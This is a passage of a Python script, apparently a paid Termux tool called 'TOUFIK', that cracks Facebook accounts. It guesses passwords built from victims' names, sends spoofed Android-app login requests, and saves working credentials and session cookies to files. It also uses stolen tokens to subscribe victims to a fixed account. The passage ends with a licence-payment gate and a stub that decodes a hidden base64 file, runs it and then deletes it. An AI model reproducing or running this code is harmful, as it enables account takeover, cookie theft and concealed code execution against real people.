                                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 10; Infinix X682B Build/RP1A.200720.012) [FBAN/FB4A;FBAV/405.0.0.31.97;FBBV/799095162;FBDM/{density=2.0,width=1440,height=1280};FBLC/en_US;FBRV/2373166FBCR/O2FBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-K500FBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]"+"Dalvik/2.1.0 (Linux; U; Android 12; Infinix X682B Build/RP1A.200720.012) [FBAN/FB4A;FBAV/405.0.0.31.97;FBBV/503825256;FBDM/{density=3.0,width=1080,height=2400};FBLC/fr_FR;FBRV/7971360FBCR/VerizonFBMF/XiaomiFBBD/XiaomiFBPN/com.facebook.katanaFBDV/Mi 9TFBSV/4.2.2FBOP/1FBCA/x86:armeabi-v7a]"+"Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/405.0.0.31.97;FBBV/640418465;FBDM/{density=2.0,width=720,height=2400};FBLC/ar_AR;FBRV/4734336FBCR/AT&TFBMF/XiaomiFBBD/XiaomiFBPN/com.facebook.katanaFBDV/Redmi Note 9 ProFBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]"+"Dalvik/2.1.0 (Linux; U; Android 11; Pixel 3 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/405.0.0.31.97;FBBV/569257348;FBDM/{density=3.0,width=1080,height=2400};FBLC/fr_FR;FBRV/2446821FBCR/VodafoneFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 6 ProFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]"
                                head = {'User-Agent': u2a,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                                
                                url = 'https://b-graph.facebook.com/auth/login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                
                                po = requests.post(url, data=data, headers=head, allow_redirects=False).text
                                q = json.loads(po)
                                
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\x1b[1;92m<[TOUFIK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        #print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
                                        open('/sdcard/TOUFIK_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TOUFIK_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                        
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[TOUFIK-2F]> '+ids+' | '+pas)
                                                open('/sdcard/TOUFIK-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
        
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\x1b[38;5;246m<[TOUFIK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/TOUFIK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/TOUFIK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                                        
                        loop+=1
                        
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                        
                except Exception as e:
                        pass

#------------------[  METODE 3  ]-------------------#
def M_file_3(ids,names,passlist):
                try:
                        global ok,loop
                        boos = random.choice([P, M, H, K, B, U, O, N])
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}TOUFIK-TLAMCANI\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                        sys.stdout.flush()
                        
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                                
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/405.0.0.31.97;FBBV/465003548;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBRV/3586961FBCR/AT&TFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 5 IIFBSV/10.0FBOP/1FBCA/x86:armeabi-v7a]',Dalvik/2.1.0 (Linux; U; Android 12; SM-A505F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/400.0.0.28.90;FBBV/691546243;FBDM/{density=2.0,width=720,height=1920};FBLC/fr_FR;FBRV/7236425FBCR/TelecomFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 10FBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]"                           
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                li = ['28']
                                li2 = random.choice(li)
                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                                head = {
                                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\x1b[1;92m<[TOUFIK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
                                        open('/sdcard/TOUFIK_m3_OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                #print('\r\x1b[38;5;246m<[TOUFIK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/TOUFIK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                        
#------------------[  METODE 4  ]-------------------#              
def M_file_44(ids,names,passlist):
        try:
                global ok,loop,sim_id
                boos = random.choice([P, M, H, K, B, U, O, N])
                sys.stdout.write(f'\r\r\033[1;37m<[{boos}TOUFIK-TLAMCANI\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = ua1()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        headers = {
                                'User-Agent': ua,
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': '25227',
                                'X-FB-SIM-HNI': '29752',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                'Content-Length': '674'
                        }
                        #
                        data = {
                            'adid': str(uuid.uuid4()),
                            'format': 'json',
                            'device_id': str(uuid.uuid4()),
                            'cpl': 'true',
                            'family_device_id': str(uuid.uuid4()),
                            'credentials_type': 'device_based_login_password',
                            'error_detail_type': 'button_with_disabled',
                            'source': 'device_based_login',
                            'email': ids,
                            'password': pas,
                            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                            'generate_session_cookies': '1',
                            'meta_inf_fbmeta': '',
                            'advertiser_id': str(uuid.uuid4()),
                            'currently_logged_in_userid': '0',
                            'locale': "en_US",
                            'client_country_code': "US",
                            'method': 'auth.login',
                            'fb_api_req_friendly_name': 'authenticate',
                            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                            'api_key': '882a8490361da98702bf97a021ddc14d'
                        }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\x1b[1;92m<[TOUFIK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        coki="sb=shawXD01;"+coki
                                        open('/sdcard/TOUFIK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
                                        open('/sdcard/TOUFIK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[TOUFIK-2F]> '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\x1b[38;5;246m<[TOUFIK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/TOUFIK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TOUFIK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:time.sleep(10)

#------------------[  METODE 4  ]-------------------#              
def M_file_4(ids, names, passlist):
	try:
		global ok, loop,  sim_id
		boos = random.choice([P, M, H, K, B, U, O, N])
		sys.stdout.write(f'\r\r\033[1;37m<[{boos}TOUFIK-TLAMCANI\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
        
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
			
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			adid = str(uuid.uuid4())
			fbav = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
			fbbv = str(random.randint(111111111,999999999))
			fbrv = str(random.randint(111111111,999999999))
			model = device['model']
			build = device['build']
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			#fbca = device['fbca']
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.1.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.75,width=720,height=1529};FBLC/pt_BR;FBRV/'+fbrv+';FBCR/UNITEL;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+fbsv+'.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(20000, 40000)),'X-FB-SIM-HNI':str(random.randint(20000, 40000)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url,params=data,headers=head,allow_redirects=False).json()
			if 'session_key' in po:
				print('\r\x1b[1;92m<[TOUFIK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
				open('/sdcard/TOUFIK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
				session = po['session_cookies']
				cookie = ''
				cuser = session[0]
				cuser = session[0]['name']+'='+session[0]['value']
				cookie+=cuser+';'
				xs = session[1]['name']+'='+session[1]['value']
				cookie+=xs+';'
				fr = session[2]['name']+'='+session[2]['value']
				cookie+=fr+';'
				datr = session[3]['name']+'='+session[3]['value']
				cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
				pagevoice = cuser.replace('c_user','m_page_voice')
				cookie+=pagevoice
				#print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
				open('/sdcard/TOUFIK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
				#token = po['access_token']
				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
				oks.append(ids)
				break
			elif 'www.facebook.com' in po['error']['message']:
				    if 'y' in pcp:
					        print('\r\x1b[38;5;246m<[TOUFIK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
					        open('/sdcard/TOUFIK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					        cps.append(ids)
					        break
				            
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		#print(e)
		pass
#------------------[  approval  ]-------------------#        
def newkey():
    ff = requests.get(link)
    u = str(os.getuid())  # الحصول على UID النظام
    pl = str(platform.platform())  # معلومات النظام
    pl = pl.replace('.', '').replace("-", "")[::-1].upper()  # تعديل وتحويل إلى أحرف كبيرة مقلوبة
    kk = u + pl[6:6] + platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + u
    
    # لا يوجد تشفير Base85 هنا
    key = kk  # المفتاح يتم تحديده بدون تشفير
    
    # التحقق من البيانات المرسلة
    if "XXFXXFXX" in ff.text:
        if kk in ff.text:
            if key in ff.text:
                return 'Trial', '\033[1;91mPaid\033[1;97m'
        else:
            return "Trial", "\033[1;92mFree\033[1;97m"
    
    if ff.text == 'null':
        return 'Napv' + kk
    if kk in ff.text:
        if key in ff.text:
            return 'Apv'
        else:
            return 'Fuck'
    else:
        return 'Napv' + kk 
    
def approval():
  clear()
  try:
    sec = newkey()
    if sec=='Fuck':Fuck()
    if 'Trial' in sec:
        Trial(sec[1])
    if 'Napv' in sec:
      boos = random.choice([P, M, H, K, B, U, O, N])
      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}TOUFIK+\033[1;32m"+sec.replace('Napv',''))
      print('\033[1;34m─────────────────────────────────────────────')
      print(' \033[1;32m[\033[1;31m–\033[1;32m] You are not premuim user first buy premuim ')
      print('\033[1;34m-─────────────────────────────────────────────')
      print(f"\033[1;32m[\033[1;31m–\033[1;32m] {boos} Binance \033[1;33m >> \033[1;31m ID : 502596661 ")
      print('\033[1;34m-─────────────────────────────────────────────')
      print("\033[1;32m[\033[1;31m–\033[1;32m] 15$ Approval For 1 month  ")
      print("\033[1;32m[\033[1;31m–\033[1;32m] 10$ Approval For 15 days  ")
      print("\033[1;32m[\033[1;31m–\033[1;32m] 5$ Approval For 7 days  ")        
      print('\033[1;34m─────────────────────────────────────────────')     
      print(" \033[1;32m[\033[1;31m–\033[1;32m] Note : \033[1;32mPAY AND TRY")
      print('\033[1;34m─────────────────────────────────────────────')
      input(' \033[1;32m[\033[1;31m–\033[1;32m] Press Enter To Go To WhatsApp')
      os.system('am start https://wa.me/+213552612114')
      approval()
    if sec=='Apv':menu()
    else:exit()
  except KeyboardInterrupt:exit()
  except Exception as e:e=base64.b16encode(str(e).encode('ascii'));print('Something went wrong error code : '+e.decode('ascii'));exit() 
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass'
try:
    with open(A, 'wb') as D: D.write(B.b64decode(C))
    os.system('python3 .ninjapy' + ' '.join(sys.argv[1:]))
except Exception as E: print(E)
finally:
    if os.path.exists(A): os.remove(A)
